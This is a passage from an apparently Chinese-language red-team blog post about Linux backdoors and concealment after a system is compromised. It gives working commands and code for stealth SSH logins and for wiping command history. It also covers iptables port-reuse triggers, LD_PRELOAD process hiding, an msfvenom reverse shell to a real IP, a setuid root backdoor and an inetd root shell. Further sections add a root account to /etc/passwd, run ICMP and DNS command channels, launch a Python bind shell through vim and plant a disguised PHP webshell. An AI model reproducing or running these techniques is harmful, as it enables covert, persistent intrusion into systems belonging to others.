href="#Openssh-Rookit" class="headerlink" title="Openssh Rookit"></a>Openssh Rookit</h3><p>需要安装环境依赖，可用性不是很高，参考<a href="https://www.cnblogs.com/bigdevilking/p/9535427.html" target="_blank" rel="noopener">利用Openssh后门 劫持root密码</a></p><h3 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h3><p>隐身登录<br>隐身登录系统，不会被last who w等指令检测到</p><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -T username@host /bin/bash -i<span class="token function">ssh</span> -o UserKnownHostsFile<span class="token operator">=</span>/dev/null -T user@host /bin/bash -if</code></pre><h2 id="Linux隐藏技术"><a href="#Linux隐藏技术" class="headerlink" title="Linux隐藏技术"></a>Linux隐藏技术</h2><h3 id="简单的隐藏文件"><a href="#简单的隐藏文件" class="headerlink" title="简单的隐藏文件"></a>简单的隐藏文件</h3><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">touch</span> .wing.py</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI2OTY5NzUwODMuanBn?x-oss-process=image/format,png" alt="-w906"></p><p>可以找一些目录隐藏自己的恶意文件</p><h3 id="隐藏权限"><a href="#隐藏权限" class="headerlink" title="隐藏权限"></a>隐藏权限</h3><p>chattr命令可以给文件加<code>锁</code>，防止被删除，我们也可以将它利用起来</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MTA1MTUwODcuanBn?x-oss-process=image/format,png" alt="-w637"></p><p>解<code>锁</code>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MTEwNzIxNzguanBn?x-oss-process=image/format,png" alt="-w661"></p><p><strong>-w661</strong></p><h3 id="隐藏历史操作命令"><a href="#隐藏历史操作命令" class="headerlink" title="隐藏历史操作命令"></a>隐藏历史操作命令</h3><p>拿到shell以后，开始<code>无痕模式</code>，禁用命令历史记录功能。</p><pre><code>set +o history</code></pre><p>恢复</p><pre><code>set -o history</code></pre><pre><code>history</code></pre><p>可以看到恢复以后可以正常记录历史命令</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MjAwNzA1MjEuanBn?x-oss-process=image/format,png" alt="-w463"></p><p><strong>-w463</strong></p><h3 id="删除自己的历史命令"><a href="#删除自己的历史命令" class="headerlink" title="删除自己的历史命令"></a>删除自己的历史命令</h3><p>删除指定的历史记录</p><pre><code>sed -i &quot;100,$d&quot; .bash_history</code></pre><p>删除100行以后的操作命令</p><p>demo</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MjQ1ODk2MzUuanBn?x-oss-process=image/format,png" alt="-w636"></p><p><strong>-w636</strong></p><h3 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h3><h4 id="通过SSLH在同一端口上共享SSH与HTTPS"><a href="#通过SSLH在同一端口上共享SSH与HTTPS" class="headerlink" title="通过SSLH在同一端口上共享SSH与HTTPS"></a>通过SSLH在同一端口上共享SSH与HTTPS</h4><p>Linux上在同一端口上共享SSH与HTTPS的工具：SSLH</p><pre><code>安装SSLHapt install sslh 配置SSLH 编辑 SSLH 配置文件： sudo vi /etc/default/sslh 1、找到下列行：Run=no  将其修改为：Run=yes 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443  DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;  service sslh start</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3NDM1MjYzMDYuanBn?x-oss-process=image/format,png" alt="-w1511"></p><p><strong>-w1511</strong></p><p>测试：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3NDQyMDk2NTcuanBn?x-oss-process=image/format,png" alt="-w1102"></p><p><strong>-w1102</strong></p><p>环境是docker，444对应的是靶机的443<br>测试成功</p><h4 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h4><pre><code># 端口复用链iptables -t nat -N LETMEIN# 端口复用规则iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22# 开启开关iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT# 关闭开关iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT# let&#39;s do itiptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</code></pre><p>exploit</p><p>TIPS：docker测试的时候</p><pre><code>docker run -ti --privileged ubuntu:latest</code></pre><p>–privileged这个参数一定要加上</p><pre><code>#开启复用echo threathuntercoming | socat - tcp:192.168.19.170:80#ssh使用80端口进行登录ssh -p 80 root@192.168.19.170:#关闭复用echo threathunterleaving | socat - tcp:192.168.19.170:80</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3ODgzNzA3MTIuanBn?x-oss-process=image/format,png" alt="-w903"></p><p><strong>-w903</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3ODgyNTY3MjQuanBn?x-oss-process=image/format,png" alt="-w1125"></p><p><strong>-w1125</strong></p><p>另外还有icmp的利用方式<br>原文在<br>远程遥控 IPTables 进行端口复用<br><a href="https://www.freebuf.com/articles/network/137683.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/137683.html</a></p><h3 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h3><h4 id="libprocesshider"><a href="#libprocesshider" class="headerlink" title="libprocesshider"></a>libprocesshider</h4><p>github上的一个项目，项目地址<br><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a></p><pre><code>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下：# 下载程序编译git clone https://github.com/gianlucaborello/libprocesshider.gitapt-get install  gcc automake autoconf libtool makecd libprocesshider/ &amp;&amp; make# 移动文件到/usr/local/lib/目录下cp libprocesshider.so /usr/local/lib/# 把它加载到全局动态连接局echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload或者export LD_PRELOAD=/usr/local/lib/libprocesshider.so</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MDMyMDc4ODguanBn?x-oss-process=image/format,png" alt="-w1083"></p><p><strong>-w1083</strong></p><p>运行</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTYzNzM4OTUuanBn?x-oss-process=image/format,png" alt="-w821"></p><p><strong>-w821</strong></p><p>效果</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTY0OTYzNDAuanBn?x-oss-process=image/format,png" alt="-w1112"></p><p><strong>-w1112</strong></p><p>具体的进程名字，自己可以在c文件里面设置</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTY4NTI1ODkuanBn?x-oss-process=image/format,png" alt="-w732"></p><p><strong>-w732</strong></p><p>克制它的工具</p><pre><code>unhide  proc</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTc0Mzc4OTQuanBn?x-oss-process=image/format,png" alt="-w790"></p><p><strong>-w790</strong></p><h4 id="linux-inject"><a href="#linux-inject" class="headerlink" title="linux-inject"></a>linux-inject</h4><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>项目地址： <a href="https://github.com/gaffe23/linux-inject.git" target="_blank" rel="noopener">https://github.com/gaffe23/linux-inject.git</a></p><pre><code># 下载程序编译git clone https://github.com/gaffe23/linux-inject.gitcd linux-inject &amp;&amp; make# 测试进程./sample-target# 进程注入./inject -n sample-target sample-library.so</code></pre><p>先编译自己定义的c文件<br>安装依赖包</p><pre><code>sudo apt-get purge libc6-devsudo apt-get install libc6-devsudo apt-get install libc6-dev-i386sudo apt-get install clang</code></pre><pre><code>#include &lt;stdio.h&gt;__attribute__((constructor))void hello() {    puts(&quot;Hello world!&quot;);}</code></pre><p>生成so文件</p><pre><code>gcc -shared -fPIC -o libwing.so hello.c</code></pre><p>先执行测试的文件</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODMwMzE0OTA0MzAuanBn?x-oss-process=image/format,png" alt="-w787"></p><p><strong>-w787</strong></p><p>然后注入自定义的so文件</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODMwMzEzNjA3NTcuanBn?x-oss-process=image/format,png" alt="-w868"></p><p><strong>-w868</strong></p><p>注入成功。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODMwMjgyNjk0MTkuanBn?x-oss-process=image/format,png" alt="-w610"></p><p><strong>-w610</strong></p><h2 id="Vegile"><a href="#Vegile" class="headerlink" title="Vegile"></a>Vegile</h2><p>在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack。</p><p>Vegile是一个用来隐藏自己的进程的工具，即使进程被杀，又会重新启动。</p><p>先生成一个msf后门</p><p>bash</p><pre class=" language-bash"><code class="language-bash">msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST<span class="token operator">=</span>149.129.72.186  LPORT<span class="token operator">=</span>8000  -f elf -o /var/www/html/Wing_Backdoor2</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MDQ2NjY3MTguanBn?x-oss-process=image/format,png" alt="-w1653"></p><p><strong>-w1653</strong></p><p>msf开启监听</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MTI1NjkwODAuanBn?x-oss-process=image/format,png" alt="-w1250"></p><p><strong>-w1250</strong></p><p>执行</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MTE1MDM3MjEuanBn?x-oss-process=image/format,png" alt="-w864"></p><p><strong>-w864</strong></p><p>第一种是进程注入的方式<br>第二种是进程被杀还可以继续反弹shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MjcyMzUxNjcuanBn?x-oss-process=image/format,png" alt="-w915"></p><p><strong>-w915</strong></p><p>由于依赖的原因，第二种有点小bug</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2Mjc1NDQ0MDcuanBn?x-oss-process=image/format,png" alt="-w994"></p><p><strong>-w994</strong></p><p>测试成功。</p><h2 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a>Cymothoa</h2><p>Cymothoa是一个轻量级的后门，也是使用进程注入的方法。</p><p>下载地址：<br><a href="https://sourceforge.net/projects/cymothoa/files/latest/download" target="_blank" rel="noopener">https://sourceforge.net/projects/cymothoa/files/latest/download</a></p><p>编译好的地址<br><a href="https://github.com/BlackArch/cymothoa-bin" target="_blank" rel="noopener">https://github.com/BlackArch/cymothoa-bin</a></p><p>使用方法</p><pre><code>./cymothoa -S</code></pre><p>查看可用的shellcode</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5MjUzMjY2MzMuanBn?x-oss-process=image/format,png" alt="-w746"></p><p><strong>-w746</strong></p><p>只要反弹shell的功能，0即可</p><p>查找到bash的pid，因为bash进程一般都是存在的</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5MjY1MzgxNDUuanBn?x-oss-process=image/format,png" alt="-w530"></p><p><strong>-w530</strong></p><pre><code>./cymothoa -p pid -s 1 -y port</code></pre><p>不太可控，我在kali测试会把进程弄死掉，实际环境不建议使用。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5NDIzNzkxODEuanBn?x-oss-process=image/format,png" alt="-w668"></p><p><strong>-w668</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5NDI3NTcwNzQuanBn?x-oss-process=image/format,png" alt="-w677"></p><p><strong>-w677</strong></p><p>然后我msf的窗口就卡死了<br>成功的话nc可以直接连接自定义的端口，跟环境有关系。</p><h2 id="Setuid-and-Setgid"><a href="#Setuid-and-Setgid" class="headerlink" title="Setuid and Setgid"></a>Setuid and Setgid</h2><p>setuid: 设置使文件在执行阶段具有文件所有者的权限. 典型的文件是 /usr/bin/passwd. 如果一般用户执行该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码.</p><p>setgid: 该权限只对目录有效. 目录被设置该位后， 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组.</p><p>sticky bit: 该位可以理解为防删除位. 一个文件是否可以被某用户删除， 主要取决于该文件所属的组是否对该用户具有写权限. 如果没有写权限， 则这个目录下的所有文件都不能被删除， 同时也不能添加新的文件. 如果希望用户能够添加文件但同时不能删除文件， 则可以对文件使用sticky bit位. 设置该位后， 就算用户对目录具有写权限， 也不能删除该文件.</p><p>众所周知，Linux的文件权限如: 777;666等，其实只要在相应的文件上加上UID的权限，就可以用到加权限人的身份去运行这个文件。所以我们只需要将bash复制出来到另一个地方， 然后用root加上UID权限，只要用户运行此Shell就可以用用root的身份来执行任何文件了。</p><p>写一个简单的后门：<br>backdoor.c</p><pre><code>#include &lt;unistd.h&gt;void main(int argc, char *argv[]){    setuid(0);    setgid(0);    if(argc &gt; 1)        execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, argv[1], NULL);    else        execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);}</code></pre><p>编译：</p><pre><code>gcc backdoor.c -o backdoor</code></pre><pre><code>cp backdoor /bin/</code></pre><pre><code>chmod u+s /bin/backdoor</code></pre><p>wing权限执行backdoor</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjA1NzU4MjEuanBn?x-oss-process=image/format,png" alt="-w667"></p><p><strong>-w667</strong></p><h2 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h2><p>inetd是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。 它可以为多种服务管理连接，当inetd 接到连接时，它能够确定连接所需的程序，启动相应的进程，并把socket 交给它（服务socket 会作为程序的标准输入、 输出和错误输出描述符）。</p><p>安装</p><pre><code>apt-get install openbsd-inetd</code></pre><p>用系统自带的服务</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjY0MTIyNzcuanBn?x-oss-process=image/format,png" alt="-w670"></p><p><strong>-w670</strong></p><p>配置后门</p><pre><code># vi /etc/inetd.conf    fido  stream tcp nowait  root  /bin/bash bash -i # 当外部请求名为fido的服务时就弹shellinetd</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjY4MDU5ODUuanBn?x-oss-process=image/format,png" alt="-w492"></p><p><strong>-w492</strong></p><p>nc连接</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjgwMzEyMzEuanBn?x-oss-process=image/format,png" alt="-w652"></p><p><strong>-w652</strong></p><p>参考：<a href="https://klionsec.github.io/2017/10/23/inetd-backdoor/" target="_blank" rel="noopener">基于 inetd 后门的简要分析及利用</a></p><h2 id="添加后门账户"><a href="#添加后门账户" class="headerlink" title="添加后门账户"></a>添加后门账户</h2><pre><code>生成密码perl -e &#39;print crypt(&quot;wing&quot;, &quot;AA&quot;). &quot;\n&quot;&#39;直接添加到passwdecho &quot;weblogic1:AAyx65VrBb.fI:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></pre><p>容易被检测出来，还不如直接ssh key</p><h2 id="ICMP后门"><a href="#ICMP后门" class="headerlink" title="ICMP后门"></a>ICMP后门</h2><p>项目地址：<a href="https://github.com/andreafabrizi/prism" target="_blank" rel="noopener">https://github.com/andreafabrizi/prism</a><br>编译</p><p>Android平台：</p><pre><code>apt-get install gcc-arm-linux-gnueabiarm-linux-gnueabi-gcc -DSTATIC -DDETACH -DNORENAME -static -march=armv5 prism.c -o prism</code></pre><p>Linux 64bit：</p><pre><code>apt-get install libc6-dev-amd64gcc -DDETACH -m64 -Wall -s -o prism prism.c</code></pre><p>Linux 32bit：</p><pre><code>apt-get install libc6-dev-i386gcc -DDETACH -m32 -Wall -s -o prism prism.c</code></pre><p>查看信息:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0NzUxNzM3NzYuanBn?x-oss-process=image/format,png" alt="-w616"></p><p><strong>-w616</strong></p><p>攻击机上等待后门连接</p><pre><code> nc -l -p 9999</code></pre><p>发包触发后门</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0Nzc2OTI0MTYuanBn?x-oss-process=image/format,png" alt="-w1069"></p><p><strong>-w1069</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0Nzc0ODExNTcuanBn?x-oss-process=image/format,png" alt="-w616"></p><p><strong>-w616</strong></p><h2 id="DNS后门"><a href="#DNS后门" class="headerlink" title="DNS后门"></a>DNS后门</h2><p>项目地址:<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a></p><p>即使在最苛刻环境下，目标肯定也会允许DNS去解析外部或者内部的domain。<br>这就可以作为一个C2通道。command和数据夹杂在DNS查询和响应头中，所以检测起来很困难，因为命令都隐藏在正常的流量里面。</p><p>我们使用<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2</a>来实现</p><p>我mac上安装有问题，烦得很，环境麻烦，kali了。<br>算了，还是主机吧，困。。。<br>server里面要换源，建议直接指定gemfile里面的源是<a href="https://gems.ruby-china.com/" target="_blank" rel="noopener">https://gems.ruby-china.com/</a></p><p>我的配置：</p><pre><code># Gemfile# By Ron Bowes## See LICENSE.mdsource &#39;https://gems.ruby-china.com/&#39;gem &#39;trollop&#39; # Commandline parsinggem &#39;salsa20&#39; # Encrypted connectionsgem &#39;sha3&#39;    # Message signing + key derivationgem &#39;ecdsa&#39;   # Used for ECDH key exchange</code></pre><pre><code>$ gem install bundler$ bundle install</code></pre><p>启动这玩意。</p><pre><code>sudo ruby dnscat2.rb --dns &quot;domain=attck.me,host=192.168.123.192&quot; --no-cache</code></pre><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-dqkWOfC6-1596077301299)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552755979068-1552755979075.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552755979068-1552755979075.png)]</a></p><p><strong>title</strong></p><p>然后把控制端编译好，直接make</p><pre><code>./dnscat --dns server=192.168.123.192</code></pre><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-r35h8Mf5-1596077301300)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756235075-1552756235078.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756235075-1552756235078.png)]</a></p><p><strong>title</strong></p><p>这边主机运行</p><pre><code>session -i 1</code></pre><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-9v0ovcC0-1596077301301)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756349556-1552756349564.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756349556-1552756349564.png)]</a></p><p><strong>title</strong></p><p>我来抓包看看怎么通信的。</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-mSfe2yuL-1596077301301)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757073936-1552757073947.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757073936-1552757073947.png)]</a></p><p><strong>title</strong></p><p>所有命令将通过DNS流量传输</p><p>我们试下powershell版本的dnscat：<br><a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a></p><p>language</p><pre class=" language-language"><code class="language-language">Start-Dnscat2 -Domain attck.me -DNSServer 192.168.123.192</code></pre><p>已经上线了</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-fXFvGKYy-1596077301302)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757591988-1552757591997.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757591988-1552757591997.png)]</a></p><p><strong>title</strong></p><p>然后新开一个交互式shell</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-lHUephWn-1596077301302)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757742594-1552757742601.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757742594-1552757742601.png)]</a></p><p><strong>title</strong></p><p><strong>结论</strong><br>使用dnscat2有各种优点：<br>支持多个会话<br>流量加密<br>使用密钥保护MiTM攻击<br>直接从内存运行PowerShell脚本</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0OTY4MDQ1NjMuanBn?x-oss-process=image/format,png" alt="-w739"></p><p><strong>-w739</strong></p><h2 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h2><p>先构造一个恶意脚本<br>wing.py</p><pre><code>from socket import *import subprocessimport os, threading, sys, timeif __name__ == &quot;__main__&quot;:        server=socket(AF_INET,SOCK_STREAM)        server.bind((&#39;0.0.0.0&#39;,666))        server.listen(5)        print &#39;waiting for connect&#39;        talk, addr = server.accept()        print &#39;connect from&#39;,addr        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,                stdout=talk, stderr=talk, shell=True)</code></pre><p>前提条件就是VIM安装了python扩展,默认安装的话都有python扩展.</p><p>脚本可以放到python的扩展目录</p><pre><code>$(nohup vim -E -c &quot;py3file wing.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f wing.py</code></pre><p>在后台看得到vim的进程,但是看不到python的进程.</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ3OTkxMzc0NDEuanBn?x-oss-process=image/format,png" alt="-w703"></p><p><strong>-w703</strong></p><p>原理参考:<a href="https://github.com/jaredestroud/WOTD" target="_blank" rel="noopener">https://github.com/jaredestroud/WOTD</a></p><h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>PAM （Pluggable AuthenticationModules ）是由Sun提出的一种认证机制。</p><p>它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。</p><p>项目地址:<a href="https://github.com/litsand/shell" target="_blank" rel="noopener">https://github.com/litsand/shell</a><br>这是一个自动化脚本</p><p>比较适用于centos,测试环境是ubuntu,暂时不复现.</p><h2 id="r后门"><a href="#r后门" class="headerlink" title="\r后门"></a>\r后门</h2><pre><code>echo -e &quot;&lt;?=\`\$_POST[wing]\`?&gt;\r&lt;?=&#39;Wing  &#39;;?&gt;&quot; &gt;/var/www/html/wing.php</code></pre><p>加了<code>-e \r</code>参数之后直接查看源码,只显示后半部分</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ4MTMwOTM1OTAuanBn?x-oss-process=image/format,png" alt="-w981"></p><p><strong>-w981</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ4MTM0NzI3OTIuanBn?x-oss-process=image/format,png" alt="-w873"></p><p><strong>-w873</strong></p><h2 id="strace后门"><a href="#strace后门" class="headerlink" title="strace后门"></a>strace后门</h2><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通 过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p><pre><code>ssh=&#39;strace   -o   